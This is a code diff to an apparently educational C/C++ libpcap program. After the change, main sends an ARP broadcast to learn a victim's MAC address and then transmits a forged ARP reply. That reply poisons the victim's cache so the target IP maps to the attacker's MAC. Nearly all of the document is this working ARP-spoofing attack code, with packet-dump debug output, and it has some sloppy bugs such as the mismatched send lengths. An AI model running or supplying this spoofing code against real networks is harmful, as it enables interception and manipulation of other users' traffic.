@@ -8,43 +8,16 @@
 #include <pcap.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-
-struct EthernetInfo {
-	u_char DMac[6];
-	u_char SMac[6];
-	u_short Type;
-};
-
-struct ArpInfo {
-	uint16_t hardware_type;
-	uint16_t protocol_type;
-	uint8_t hardware_size;
-	uint8_t protocol_size;
-	uint16_t opcode;
-	u_char sender_mac[6];
-	u_char sender_ip[4];
-	u_char target_mac[6];
-	u_char target_ip[4];
-};
-
-typedef struct {
-	struct EthernetInfo ethernet_header;
-	struct ArpInfo arp_header;
-} L2;
-
-void usage();
-void create_arp_header(struct pcap_pkthdr *header, const u_char *packet, uint8_t *mac_address, uint8_t *sender_ip);
-void get_my_mac(uint8_t* mac_address, char* dev);
-void extract_ip(uint8_t* source_ip, char* argv);
-void send_broadcast_packet(pcap_t* handle, uint8_t *sender_mac);
-void arp_spoof(pcap_t* handle, const u_char *packet, uint8_t* host_mac, uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip);
+#include "arp_spoof.h"
 
 int main(int argc, char* argv[])
 {
-	if (argc != 4) {
-		usage();
-		//return -1;
-	}
+    if (argc != 4) {
+        usage();
+        return -1;
+    }
+
+    char* dev = argv[1];
 
 	uint8_t sender_ip[4] = { 0 };
 	uint8_t target_ip[4] = { 0 };
@@ -54,11 +27,9 @@ int main(int argc, char* argv[])
 	extract_ip(sender_ip, argv[2]);
 	extract_ip(target_ip, argv[3]);
 
-	char* dev = argv[1];
-	//char* dev = "eth0"; // using debug
 	char errbuf[PCAP_ERRBUF_SIZE];
 
-	pcap_t* handle = pcap_open_live(dev, 42, 1, 1000, errbuf);  // change BUFSIZE -> ONLY 42
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
 		return -1;
@@ -67,14 +38,17 @@ int main(int argc, char* argv[])
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 	int res = pcap_next_ex(handle, &header, &packet);
-	//if (res == 0) continue;
-	//if (res == -1 || res == -2) break;
+    //if (res == 0) continue;
+    //if (res == -1 || res == -2) break;
 
 	printf("host device mac address : ");
 	get_my_mac(host_mac, dev);
-	create_arp_header(header, packet, host_mac, sender_ip); // call function print basic info
-	send_broadcast_packet(handle, sender_mac);
-	pcap_close(handle);
+
+    // create broadcast packet and get sender mac address
+    create_arp_header(packet, host_mac, sender_ip, handle, sender_mac);
+    arp_spoof(handle, packet, host_mac, sender_mac, sender_ip, target_ip);
+
+    pcap_close(handle);
 
 	return 0;
 }
@@ -84,13 +58,15 @@ void usage() {
 	// ex : send_arp eth0 192.168.43.71 192.168.43.1
 }
 
-void create_arp_header(struct pcap_pkthdr *header, const u_char *packet, uint8_t *mac_address, uint8_t *sender_ip) {
+void create_arp_header(const u_char *packet, uint8_t *mac_address, uint8_t *sender_ip, pcap_t* handle, uint8_t *sender_mac) {
 	L2* l2_layer = const_cast<L2*>(reinterpret_cast<const L2*>(packet));
+    u_char broadcast_arp[42] = {0};
 
 	for (int i = 0; i < 6; i++) {
 		l2_layer->ethernet_header.DMac[i] = 0xff;
 		l2_layer->ethernet_header.SMac[i] = mac_address[i];
 	}
+
 	l2_layer->ethernet_header.Type = htons(0x0806);
 	l2_layer->arp_header.hardware_type = htons(0x0001);
 	l2_layer->arp_header.protocol_type = htons(0x0800);
@@ -108,50 +84,54 @@ void create_arp_header(struct pcap_pkthdr *header, const u_char *packet, uint8_t
 		l2_layer->arp_header.sender_ip[i] = 00;
 		l2_layer->arp_header.target_ip[i] = sender_ip[i];
 	}
-}
 
-void send_broadcast_packet(pcap_t* handle, uint8_t *sender_mac) {
-	u_char broadcast_arp[42];
+    printf("This is L2 size %d\n", sizeof(L2));
 
-	// send one broadcast packet
-	if (pcap_sendpacket(handle, broadcast_arp, 60) != 0) {
-		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
-		return;
-	}
+    memcpy(broadcast_arp, l2_layer, sizeof(L2));
 
-	printf("========== REQUEST ==========\n");
+    printf("Send broadcast packet\n");
+    for(int i=0; i<42; i++) {
+        printf("%2x ", broadcast_arp[i]);
+    }
 
-	while (true) {
-		struct pcap_pkthdr* header;
-		const u_char* packet;
+    if (pcap_sendpacket(handle, broadcast_arp, 60) != 0) {
+        fprintf(stderr, "\n Error Sending the packet: \n", pcap_geterr(handle));
+        return;
+    }
 
-		int res = pcap_next_ex(handle, &header, &packet);
-		if (res == 0) continue;
-		if (res == -1 || res == -2) break;
-		printf("%u bytes captured\n", header->caplen);
+    printf("========== REQUEST ==========\n");
 
-		L2* broad_packet = const_cast<L2*>(reinterpret_cast<const L2*>(packet));
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
 
-		// check arp type
-		if (ntohs(broad_packet->ethernet_header.Type) == 0x0806) {
-			for (int i = 0; i < 6; i++) {
-				sender_mac[i] = broad_packet->arp_header.sender_mac[i];
-			}
-		}
-		printf("==============================\n");
-	}
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+        // printf("%u bytes captured\n", header->caplen);   // for debug
+
+        L2* broad_packet = const_cast<L2*>(reinterpret_cast<const L2*>(packet));
+
+        if (ntohs(broad_packet->ethernet_header.Type) == 0x0806) { // check arp type
+            //printf("find arp header type\n");
+            for (int i = 0; i < 6; i++) {
+                sender_mac[i] = broad_packet->arp_header.sender_mac[i];
+            }
+        }
+        break;
+    }
 }
 
 void extract_ip(uint8_t* source_ip, char* argv) {
-	char* split_ip;
+    char* split_ip;
 
-	split_ip = strtok(argv, ".");
-	source_ip[0] = strtoul(split_ip, nullptr, 10);
+    split_ip = strtok(argv, ".");
+    source_ip[0] = strtoul(split_ip, nullptr, 10);
 
-	for (int i = 1; i < 4; i++) {
-		split_ip = strtok(NULL, ".");
-		source_ip[i] = strtoul(split_ip, nullptr, 10);
-	}
+    for (int i = 1; i < 4; i++) {
+        split_ip = strtok(NULL, ".");
+        source_ip[i] = strtoul(split_ip, nullptr, 10);
+    }
 }
 
 void get_my_mac(uint8_t* mac_address, char* dev) {
@@ -171,7 +151,7 @@ void get_my_mac(uint8_t* mac_address, char* dev) {
 }
 
 void arp_spoof(pcap_t* handle, const u_char *packet, uint8_t* host_mac, uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip) {
-	u_char arp_spoof[42];
+    u_char arp_spoof[42] = {0};
 
 	L2* spoof_packet = const_cast<L2*>(reinterpret_cast<const L2*>(packet));
 
@@ -179,6 +159,7 @@ void arp_spoof(pcap_t* handle, const u_char *packet, uint8_t* host_mac, uint8_t*
 		spoof_packet->ethernet_header.DMac[i] = sender_mac[i];
 		spoof_packet->ethernet_header.SMac[i] = host_mac[i];
 	}
+
 	spoof_packet->ethernet_header.Type = htons(0x0806);
 	spoof_packet->arp_header.hardware_type = htons(0x0002);
 	spoof_packet->arp_header.protocol_type = htons(0x0800);
@@ -196,9 +177,18 @@ void arp_spoof(pcap_t* handle, const u_char *packet, uint8_t* host_mac, uint8_t*
 		spoof_packet->arp_header.target_ip[i] = sender_ip[i];
 	}
 
-	//memcpy(arp_spoof, &spoof_packet, sizeof(spoof_packet));
-	if (pcap_sendpacket(handle, arp_spoof, 60) != 0) {
-		fprintf(stderr, "\nError arp spoofing packet: \n", pcap_geterr(handle));
+    printf("====== arp spoof start ======\n");
+    for(int i=0; i<42; i++) {
+        printf("%2x ", arp_spoof[i]);
+    }
+    memcpy(arp_spoof, spoof_packet, sizeof(L2));
+    printf("Arp spoof packet\n");
+    for(int i=0; i<42; i++) {
+        printf("%2x ", arp_spoof[i]);
+    }
+
+    if (pcap_sendpacket(handle, arp_spoof, 60) != 0) {
+        fprintf(stderr, "\n Error Arp spoofing packet: \n", pcap_geterr(handle));
 		return;
 	}
 }
